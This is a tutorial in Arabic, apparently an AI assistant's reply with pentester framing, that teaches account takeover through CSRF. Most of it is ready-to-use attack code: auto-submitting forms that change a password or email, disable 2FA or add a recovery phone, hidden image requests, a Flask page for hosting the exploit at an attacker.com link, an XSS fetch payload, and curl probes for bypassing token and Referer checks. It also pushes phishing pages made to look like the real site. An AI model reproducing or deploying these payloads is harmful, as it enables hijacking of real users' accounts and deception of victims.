تمام، هنشرح بعمق كيفية استغلال **CSRF** في **سرقة الحسابات** من منظور عملي كـ **Pentester**، مع تركيز على الأوامر والأكواد، وهنقسم الموضوع لأجزاء واضحة مع خلاصة بالعامية المصرية بعد كل جزء. في النهاية، هنعمل لستة بكل السيناريوهات الممكنة اللي ممكن تستخدم CSRF فيها لسرقة حسابات. هنفترض إنك عندك خلفية في اختبار الاختراق، وهنبني على الشرح السابق.

---

### **1. مفهوم استغلال CSRF في سرقة الحسابات**
CSRF في سرقة الحسابات بيعتمد على استغلال **ثقة الموقع في جلسة المستخدم** لتنفيذ إجراءات تتيح للمهاجم السيطرة على الحساب. الهدف هنا هو تغيير بيانات الحساب (زي كلمة السر، البريد الإلكتروني، أو رقم الهاتف) أو ربط الحساب بخدمة خارجية (زي حساب اجتماعي) تحت سيطرة المهاجم.

#### **لماذا CSRF فعال في سرقة الحسابات؟**
- المستخدم لما يكون **مسجل دخوله**، أي طلب بيترسل للموقع بيعتبر شرعي لأن الـ **Session Cookie** بيترسل معاه.
- لو الموقع مش بيستخدم **CSRF Token** أو حماية قوية، المهاجم ممكن يخلي الضحية ينفذ إجراء حساس (زي تغيير كلمة السر) من غير ما يحس.
- الهجوم بيحتاج خداع الضحية لفتح رابط أو زيارة صفحة خبيثة، وده بيتم عادةً عبر **Phishing** أو مواقع مزيفة.

#### **الخلاصة بالعامية**:
CSRF في سرقة الحسابات زي ما تكون بتخدّع واحد يغير باسوورد حسابه من غير ما يدري. بتستغل إن الموقع شايفك logged in، فتخليه ينفذ أمر زي تغيير الإيميل أو الباسوورد، وتاخد الحساب في إيدك.

---

### **2. الجانب الفني: كيف تستغل CSRF لسرقة حساب؟**
لتنفيذ هجوم CSRF بغرض سرقة حساب، لازم تفهم إزاي الموقع بيتعامل مع الإجراءات الحساسة زي:
- تغيير كلمة السر.
- تحديث البريد الإلكتروني.
- ربط الحساب بحساب خارجي (مثل Google أو Facebook).
- إضافة طرق مصادقة إضافية (مثل رقم هاتف).

#### **خطوات تنفيذ الهجوم عملياً**:
1. **تحليل الموقع**:
   - استخدم **Burp Suite** أو **OWASP ZAP** لتفحص طلبات الموقع (GET/POST) اللي بتغير بيانات الحساب.
   - ابحث عن الطلبات الحساسة، زي:
     - `/change-password` (تغيير كلمة السر).
     - `/update-email` (تغيير البريد الإلكتروني).
     - `/link-account` (ربط حساب خارجي).
   - شوف لو فيه **CSRF Token** أو حماية زي التحقق من رأس **Referer** أو **SameSite Cookies**.

2. **إنشاء طلب خبيث**:
   - لو الطلب **GET**، اعمل رابط أو صورة خبيثة.
   - لو الطلب **POST**، اعمل نموذج HTML يبعت الطلب تلقائياً.
   - ركز على تغيير بيانات تتيح السيطرة على الحساب (مثل كلمة سر أو إيميل).

3. **خداع الضحية**:
   - أرسل الطلب الخبيث عبر بريد إلكتروني، رابط، أو صفحة مزيفة.
   - استخدم **Social Engineering** عشان تقنع الضحية تفتح الرابط (مثل: "اضغط هنا لتحديث حسابك").

#### **مثال عملي 1: سرقة حساب بتغيير كلمة السر (POST)**
افترض موقع بيغير كلمة السر بطلب POST زي ده:
```
POST /change-password
Content-Type: application/x-www-form-urlencoded
new_password=attacker123
```
- لو الموقع مش بيستخدم CSRF Token، ممكن تعمل صفحة HTML تخلّي الطلب يتبعت تلقائياً:
```html
<html>
  <body>
    <form action="/change-password" method="POST" id="csrf-form">
      <input type="hidden" name="new_password" value="attacker123">
    </form>
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>
```
- احفظ الكود ده كملف `exploit.html`، واستضفه على سيرفر (مثل Python Flask أو Apache).
- أرسل رابط الصفحة للضحية (مثل: `http://attacker.com/exploit.html`). لما الضحية يفتحها، كلمة السر هتتغير، وتقدر تسجل دخول بالباسوورد الجديد.

#### **مثال عملي 2: سرقة حساب بتغيير الإيميل (GET)**
افترض موقع بيسمح بتغيير الإيميل بطلب GET زي ده:
```
/update-email?email=attacker@example.com
```
- ممكن تستخدم صورة خبيثة:
```html
<img src="/update-email?email=attacker@example.com" width="0" height="0">
```
- حط الكود ده في بريد إلكتروني أو موقع مزيف. لما الضحية يزور الصفحة، الإيميل هيتغير، وتقدر تستخدم خاصية "نسيت كلمة السر" عشان تتحكم في الحساب.

#### **مثال عملي 3: ربط حساب خارجي (POST)**
افترض موقع بيسمح بربط حساب Google بطلب POST:
```
POST /link-account
Content-Type: application/x-www-form-urlencoded
provider=google&token=attacker_google_token
```
- اعمل كود HTML:
```html
<form action="/link-account" method="POST" id="csrf-form">
  <input type="hidden" name="provider" value="google">
  <input type="hidden" name="token" value="attacker_google_token">
</form>
<script>document.getElementById("csrf-form").submit();</script>
```
- لو نجح، حساب الضحية هيتربط بحساب Google بتاعك، وتقدر تسجل دخول بيه.

#### **استخدام أدوات**:
- **Burp Suite**:
  - سجّل طلب تغيير كلمة السر أو الإيميل.
  - استخدم **Engagement Tools > Generate CSRF PoC** لإنشاء كود هجوم جاهز.
  - مثال PoC من Burp:
    ```html
    <form action="/change-password" method="POST">
      <input type="hidden" name="new_password" value="attacker123">
      <input type="submit" value="Submit request">
    </form>
    <script>document.forms[0].submit();</script>
    ```
- **Python Flask** (لإنشاء صفحة خبيثة):
```python
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def csrf_exploit():
    return render_template_string('''
    <form action="/change-password" method="POST" id="csrf-form">
      <input type="hidden" name="new_password" value="attacker123">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>
    ''')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
- ارفع الكود على سيرفر، وأرسل الرابط للضحية.

#### **الخلاصة بالعامية**:
عشان تسرق حساب بـ CSRF، دور على طلبات زي تغيير الباسوورد أو الإيميل. لو لقيت طلب GET، حط رابط أو صورة. لو POST، اعمل صفحة HTML تبعت الطلب لوحدها. استضف الصفحة على سيرفر، وأرسلها للضحية. Burp هيسهل عليك تخلّص الكود بسرعة.

---

### **3. تحليل الحمايات وتجاوزها**
المواقع الحديثة بتحط حمايات ضد CSRF، وكـ Pentester لازم تعرف إزاي تختبرها وتتجاوزها لو فيه ثغرة.

#### **أنواع الحمايات الشائعة**:
1. **CSRF Token**:
   - رمز عشوائي بيترسل مع الطلبات الحساسة.
   - **اختبار الثغرة**:
     - أرسل طلب بدون الـ Token:
       ```bash
       curl -X POST -d "new_password=attacker123" /change-password
       ```
     - لو اتقبل، يبقى الـ Token مش فعال.
     - جرب استخدام Token قديم أو من جلسة تانية.

2. **رأس Referer/Origin**:
   - الموقع بيتحقق إن الطلب جاي من نفس النطاق.
   - **التجاوز**:
     - أرسل طلب بدون Referer:
       ```bash
       curl -X POST -H "Referer: " -d "new_password=attacker123" /change-password
       ```
     - لو نجح، يبقى فيه ثغرة.

3. **SameSite Cookies**:
   - إعداد للـ Cookies بيمنع إرسالها مع طلبات من مواقع خارجية.
   - **التجاوز**:
     - لو الـ Cookie عليه `SameSite=Lax` أو مش موجود، جرب هجوم CSRF عادي.
     - استخدم DevTools (F12) لفحص الـ Cookies.

4. **التحقق من كلمة السر الحالية**:
   - بعض المواقع بتطلب كلمة السر الحالية عشان تغير الباسوورد.
   - **التجاوز**:
     - ابحث عن طلبات تانية (زي تغيير الإيميل) مش بتطلب كلمة السر.

#### **اختبار عملي**:
- **اختبار CSRF Token**:
  - سجّل طلب POST في Burp، وأعد إرساله بدون الـ Token أو بـ Token مختلف.
  - لو الموقع قبل الطلب، يبقى فيه ثغرة.
- **اختبار Referer**:
  - استخدم Curl أو Burp لإرسال طلب بدون Referer أو من نطاق تاني.
- **اختبار مع XSS**:
  - لو لقيت ثغرة XSS في نفس الموقع، ممكن تستخدمها لإرسال طلب CSRF داخلياً:
    ```javascript
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/change-password", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("new_password=attacker123");
    ```

#### **الخلاصة بالعامية**:
لو الموقع حاطط Token، جرب تبعت طلب من غيره أو بـ Token قديم. لو بيعتمد على Referer، أرسل طلب فاضي. لو لقيت XSS، استخدمها عشان تخلّي الهجوم أقوى. فحّص كل حماية وشوف فين الفتحة.

---

### **4. سيناريوهات استغلال CSRF لسرقة الحسابات**

#### **سيناريو 1: تغيير كلمة السر**
- **الوصف**: موقع بيسمح بتغيير كلمة السر بطلب POST أو GET.
- **الاستغلال**:
  - أنشئ صفحة HTML تبعت طلب POST:
    ```html
    <form action="/change-password" method="POST" id="csrf-form">
      <input type="hidden" name="new_password" value="attacker123">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>
    ```
  - أرسل رابط الصفحة للضحية عبر إيميل أو موقع مزيف.
  - بعد تغيير الباسوورد، سجل دخول بالحساب.

#### **سيناريو 2: تغيير البريد الإلكتروني**
- **الوصف**: موقع بيسمح بتحديث الإيميل بطلب GET أو POST.
- **الاستغلال**:
  - لو GET، استخدم صورة:
    ```html
    <img src="/update-email?email=attacker@example.com" style="display:none">
    ```
  - لو POST، استخدم نموذج HTML.
  - بعد تغيير الإيميل، استخدم خاصية "نسيت كلمة السر" للسيطرة على الحساب.

#### **سيناريو 3: ربط حساب خارجي**
- **الوصف**: موقع بيسمح بربط حسابات اجتماعية (مثل Google أو Facebook).
- **الاستغلال**:
  - أنشئ طلب POST يربط حساب الضحية بحسابك:
    ```html
    <form action="/link-account" method="POST" id="csrf-form">
      <input type="hidden" name="provider" value="google">
      <input type="hidden" name="token" value="attacker_google_token">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>
    ```
  - سجل دخول باستخدام حسابك الاجتماعي.

#### **سيناريو 4: إضافة رقم هاتف للاسترداد**
- **الوصف**: موقع بيسمح بإضافة رقم هاتف لاسترداد الحساب.
- **الاستغلال**:
  - أنشئ طلب POST يضيف رقم هاتفك:
    ```html
    <form action="/add-recovery-phone" method="POST" id="csrf-form">
      <input type="hidden" name="phone" value="+1234567890">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>
    ```
  - استخدم الرقم لاسترداد الحساب.

#### **سيناريو 5: تعطيل المصادقة الثنائية (2FA)**
- **الوصف**: موقع بيسمح بتعطيل 2FA بطلب POST.
- **الاستغلال**:
  - أنشئ طلب يعطل 2FA:
    ```html
    <form action="/disable-2fa" method="POST" id="csrf-form">
      <input type="hidden" name="disable" value="true">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>
    ```
  - بعد تعطيل 2FA، جرب سرقة الحساب بتغيير الباسوورد أو الإيميل.

#### **سيناريو 6: استغلال مع XSS**
- **الوصف**: لو فيه ثغرة XSS في الموقع، ممكن تستخدمها لتنفيذ CSRF.
- **الاستغلال**:
  - أدخل كود JavaScript عبر ثغرة XSS:
    ```javascript
    fetch('/change-password', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'new_password=attacker123'
    });
    ```
  - الكود هينفذ الطلب من داخل الموقع، فيتجاوز أي حماية زي SameSite Cookies.

#### **سيناريو 7: استغلال مع Phishing**
- **الوصف**: استخدام CSRF مع حملة تصيد لخداع الضحية.
- **الاستغلال**:
  - أنشئ صفحة مزيفة تبدو زي الموقع الرسمي، وحط فيها كود CSRF.
  - أرسل بريد إلكتروني يقول: "اضغط هنا لتأكيد حسابك".
  - لما الضحية يفتح الرابط، الطلب هينفذ ويغير بيانات الحساب.

#### **سيناريو 8: استغلال API غير محمي**
- **الوصف**: بعض المواقع بتستخدم API لتغيير بيانات الحساب.
- **الاستغلال**:
  - أنشئ طلب POST للـ API:
    ```html
    <form action="/api/v1/update-email" method="POST" id="csrf-form">
      <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>
    ```
  - لو الـ API مش محمي بـ CSRF Token، الطلب هينجح.

#### **الخلاصة بالعامية**:
فيه طرق كتير تسرق بيها حساب بـ CSRF: غيّر الباسوورد، الإيميل، أو اربط حساب خارجي. لو لقيت API ضعيف أو XSS، استخدمهم. المهم تخلّي الضحية يفتح رابطك، سواء بإيميل أو صفحة مزيفة. جرب كل حاجة حساسة زي تعطيل 2FA أو إضافة رقم تليفون.

---

### **5. نصائح للـ Pentester**
1. **ركز على الإجراءات الحساسة**:
   - ابحث عن طلبات تغيير الباسوورد، الإيميل، أو ربط حسابات خارجية.
2. **اختبر الحمايات بعمق**:
   - جرب إرسال طلبات بدون CSRF Token، بـ Referer فاضي، أو من نطاق خارجي.
3. **استخدم Social Engineering**:
   - صمم إيميلات أو صفحات مقنعة عشان الضحية يفتح الرابط.
4. **دمج مع ثغرات تانية**:
   - XSS مع CSRF بيخلّي الهجوم أقوى بكتير.
5. **وثّق الثغرة**:
   - اعمل PoC واضح يورّي إزاي سرقت الحساب، مع شرح التأثير (مثل السيطرة الكاملة على الحساب).

---

### **الخلاصة النهائية بالعامية**:
CSRF في سرقة الحسابات زي ما تكون بتضحك على الموقع وتخليه يغير بيانات الحساب من غير ما الضحية يحس. كـ Pentester، دور على طلبات زي تغيير الباسوورد أو الإيميل، واعمل كود (رابط، صورة، صفحة HTML) ينفذ الطلب. لو لقيت XSS أو API ضعيف، استخدمهم عشان تخلّي الهجوم أفتك. خلّي رابطك يوصل للضحية بإيميل حلو أو صفحة شبه الرسمية. فحّص كل حماية، ولو لقيت فتحة، اعمل PoC يورّي إزاي الحساب اتسرق. لو عايز تفاصيل أكتر عن أي سيناريو، قولي!